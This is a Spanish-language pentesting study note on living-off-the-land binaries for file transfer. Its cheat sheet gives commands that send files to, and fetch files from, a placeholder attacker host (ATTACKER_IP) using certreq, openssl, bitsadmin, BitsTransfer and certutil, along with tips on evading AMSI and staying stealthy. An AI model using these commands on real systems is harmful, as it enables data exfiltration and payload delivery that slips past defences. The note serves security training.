---
tags:
  - filetransfer
  - LOTL
  - LOLBins
---
## Conceptos Clave (TL;DR)

* LOLBins (Living off the Land Binaries) son binarios legítimos del sistema operativo que un atacante utiliza para ejecutar acciones maliciosas más allá de su propósito original.

* Su uso principal en esta fase es facilitar la transferencia de archivos (subida y bajada), ejecución de comandos o evasión (bypasses).

* Las dos fuentes principales de consulta para identificar estos binarios son el proyecto LOLBAS (para Windows) y GTFOBins (para Linux).

  
## Herramientas Clave

* **LOLBAS / GTFOBins**: Repositorios web para buscar binarios del sistema (filtrando por `/download` o `/upload` / `+file download` o `+file upload`) que pueden abusarse.
* **CertReq.exe**: Binario de Windows destinado a solicitar certificados, abusado para exfiltrar (subir) archivos mediante peticiones POST HTTP.
* **Netcat (nc)**: Utilizado en la máquina atacante para escuchar conexiones entrantes y recibir archivos exfiltrados.
* **OpenSSL**: Frecuentemente preinstalado en Linux; se abusa para levantar un servidor efímero en el atacante y descargar archivos "estilo nc" hacia la víctima.
* **Bitsadmin / PowerShell (BitsTransfer)**: Herramientas nativas de Windows para administrar el Background Intelligent Transfer Service (BITS); útiles para descargar archivos sigilosamente.
* **Certutil**: Utilidad de Windows clásica (defacto wget) para descargar archivos desde URLs.

  
## Metodología Paso a Paso

### Fase 1: Identificación del Binario
Antes de transferir, se debe enumerar qué binarios están disponibles en el sistema comprometido. Consultar LOLBAS (Windows) o GTFOBins (Linux) usando los filtros de búsqueda correspondientes para confirmar si el binario soporta las funciones deseadas.

  
### Fase 2: Preparación de la Infraestructura Ofensiva
Para subir datos desde la víctima, se debe establecer un listener en la máquina del atacante (ej. usando Netcat). Para descargar herramientas hacia la víctima, el atacante debe alojar el archivo (ej. levantando un servidor web o utilizando OpenSSL con un certificado).

  
### Fase 3: Ejecución de la Transferencia
Se ejecuta el comando abusando de las banderas (flags) específicas del LOLBin en el sistema comprometido para iniciar la conexión hacia la infraestructura del atacante y realizar la transferencia del archivo.

## Cheat Sheet de Comandos

### Exfiltración (Subir archivo desde la Víctima al Atacante)

**Windows - CertReq.exe**
```bash
# [ATACANTE] Iniciar listener para recibir el archivo vía HTTP POST.

sudo nc -lvnp <ATTACKER_PORT>
```

```powershell
# [VÍCTIMA] Enviar archivo al atacante usando petición POST con CertReq.

certreq.exe -Post -config http://<ATTACKER_IP>:<ATTACKER_PORT>/ <FILE_PATH>
```

### Infiltración (Descargar archivo desde el Atacante a la Víctima)

**Linux - OpenSSL**
```bash
# [ATACANTE] 1. Generar un certificado efímero para el servidor OpenSSL.
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
  

# [ATACANTE] 2. Levantar el servidor y servir el archivo a transferir.
openssl s_server -quiet -accept <ATTACKER_PORT> -cert certificate.pem -key key.pem < <FILE_TO_SEND>
```

```bash
# [VÍCTIMA] 3. Conectarse al servidor del atacante y guardar el output.

openssl s_client -connect <ATTACKER_IP>:<ATTACKER_PORT> -quiet > <OUTPUT_FILE>
```

**Windows - Bitsadmin**
```cmd
# [VÍCTIMA] Descargar archivo usando el servicio BITS en modo foreground.

bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:<ATTACKER_PORT>/<FILE_NAME> <DESTINATION_PATH>
```

**Windows - PowerShell (BitsTransfer)**
```powershell
# [VÍCTIMA] Importar módulo nativo y descargar archivo desde el atacante.

Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ATTACKER_IP>:<ATTACKER_PORT>/<FILE_NAME>" -Destination "<DESTINATION_PATH>"
```

**Windows - Certutil**
```cmd
# [VÍCTIMA] Descargar archivo descartando la verificación del certificado y dividiendo el archivo resultante.

certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:<ATTACKER_PORT>/<FILE_NAME>
```

## "Gotchas" y Troubleshooting

* **CertReq - Errores de Parámetros**: Si al ejecutar `certreq.exe` arroja un error respecto al parámetro `-Post`, es probable que la versión en el sistema no lo soporte. Requiere subir/usar una versión actualizada.

* **OpenSSL - Certificado (DN)**: Al generar el certificado con `openssl req`, pedirá llenar el Distinguished Name (DN). Se puede ingresar `.` para dejar los campos en blanco.

* **Certutil y Antivirus**: Actualmente, el Antimalware Scan Interface (AMSI) en Windows detecta el uso de `certutil.exe` para descarga de archivos como comportamiento malicioso. Evitar su uso si AMSI está activo.

* **Sigilo con BITS**: El servicio BITS toma en cuenta la utilización de red del host para realizar las transferencias de forma más disimulada.

* **Evasión General**: Se recomienda tener notas de múltiples opciones oscuras, ya que probar alternativas es una técnica de evasión fundamental.